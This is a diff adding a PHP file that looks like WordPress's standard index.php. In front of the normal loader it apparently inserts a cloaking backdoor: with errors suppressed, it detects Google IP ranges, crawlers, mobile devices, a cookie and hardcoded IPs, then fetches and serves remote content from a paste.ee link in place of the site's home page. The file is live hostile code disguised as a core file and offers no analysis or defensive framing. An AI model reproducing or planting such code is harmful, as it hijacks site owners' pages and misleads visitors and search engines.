@@ -1,0 +1,169 @@
+<?php
+// Created Superbone
+error_reporting(0);
+
+function curl_get_contents($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+    $response = curl_exec($ch);
+    $error    = curl_error($ch);
+    $code     = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($error || $code != 200) {
+        return false;
+    }
+    return $response;
+}
+
+function getCachedContentFile($url, $cacheFile, $expireTime = 86400) {
+    if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $expireTime)) {
+        return file_get_contents($cacheFile);
+    }
+    $content = curl_get_contents($url);
+    if ($content !== false) {
+        file_put_contents($cacheFile, $content);
+        return $content;
+    }
+    if (file_exists($cacheFile)) {
+        return file_get_contents($cacheFile);
+    }
+
+    return false;
+}
+
+function parseIpRanges($json_data, $ipv4Key = 'ipv4Prefix') {
+    $ip_data = json_decode($json_data, true);
+    $ip_ranges = array();
+
+    if (isset($ip_data["prefixes"])) {
+        foreach ($ip_data["prefixes"] as $prefix) {
+            if (isset($prefix[$ipv4Key])) {
+                $ip_ranges[] = $prefix[$ipv4Key];
+            }
+        }
+    }
+    return $ip_ranges;
+}
+
+function ip_in_range($ip, $range) {
+    if (strpos($range, '/') === false) {
+        return false;
+    }
+    list($subnet, $mask) = explode('/', $range);
+
+    $ip_dec     = (float) sprintf("%u", ip2long($ip));
+    $subnet_dec = (float) sprintf("%u", ip2long($subnet));
+    $mask       = (int) $mask;  
+    $network_mask = ~((1 << (32 - $mask)) - 1);
+
+    return ($ip_dec & $network_mask) === ($subnet_dec & $network_mask);
+}
+
+function isMobileDevice() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+
+    $mobileAgents = array(
+        'android', 'avantgo', 'blackberry', 'blazer', 'cldc-', 'cupcake', 'fennec',
+        'hiptop', 'hp ipaq', 'ipad', 'iphone', 'ipod', 'kindle', 'linux armv',
+        'midp', 'mmp', 'mobile', 'motorola', 'nokia', 'opera mini', 'opera mobi',
+        'palm', 'pda', 'phone', 'pocket', 'psp', 'smartphone', 'symbian', 'treo',
+        'up.browser', 'up.link', 'wap', 'webos', 'windows ce', 'windows phone',
+        'xda', 'xiino', 'silk', 'kindle', 'iemobile', 'uc browser'
+    );
+
+    foreach ($mobileAgents as $m) {
+        if (strpos($agent, $m) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$cacheDir = dirname(__FILE__) . '/cache';
+if (!is_dir($cacheDir)) {
+    mkdir($cacheDir, 0777, true);
+}
+
+$link = "https://paste.ee/r/uesAUNB6";
+
+$googleCacheFile = $cacheDir . '/google_iprange.json';
+$google_json = getCachedContentFile("https://www.gstatic.com/ipranges/goog.json", $googleCacheFile, 86400);
+$google_ip_ranges = array();
+if ($google_json !== false) {
+    $google_ip_ranges = parseIpRanges($google_json, 'ipv4Prefix');
+}
+
+$visitor_ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"]
+    : (isset($_SERVER["HTTP_INCAP_CLIENT_IP"]) ? $_SERVER["HTTP_INCAP_CLIENT_IP"]
+    : (isset($_SERVER["HTTP_TRUE_CLIENT_IP"])  ? $_SERVER["HTTP_TRUE_CLIENT_IP"]
+    : (isset($_SERVER["HTTP_REMOTEIP"])        ? $_SERVER["HTTP_REMOTEIP"]
+    : (isset($_SERVER["HTTP_X_REAL_IP"])       ? $_SERVER["HTTP_X_REAL_IP"]
+    : $_SERVER["REMOTE_ADDR"]))));
+
+$googleallow = false;
+foreach ($google_ip_ranges as $range) {
+    if (ip_in_range($visitor_ip, $range)) {
+        $googleallow = true;
+        break;
+    }
+}
+
+$keywords = array("bot", "ahrefs", "google");
+$isBotOrCrawler = false;
+$agent = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';
+foreach ($keywords as $k) {
+    if (strpos($agent, $k) !== false) {
+        $isBotOrCrawler = true;
+        break;
+    }
+}
+
+$alow = array("85.92.66.150", "81.19.188.236", "81.19.188.235", "85.92.66.149");
+if ($_SERVER["REQUEST_URI"] == "/") {
+    if (
+        isMobileDevice() ||
+        $isBotOrCrawler ||
+        $googleallow ||
+        isset($_COOKIE["lp"]) ||
+        in_array($visitor_ip, $alow)
+    ) {
+        $txtCacheFile = $cacheDir . '/txt_content.txt';
+        $txt_data = getCachedContentFile($link, $txtCacheFile, 86400);
+
+        if ($txt_data !== false) {
+            echo $txt_data;
+            exit;
+        }
+    }
+}
+
+?>
+
+<?php
+// this is your modifier content index this is an example of wordpress default content
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
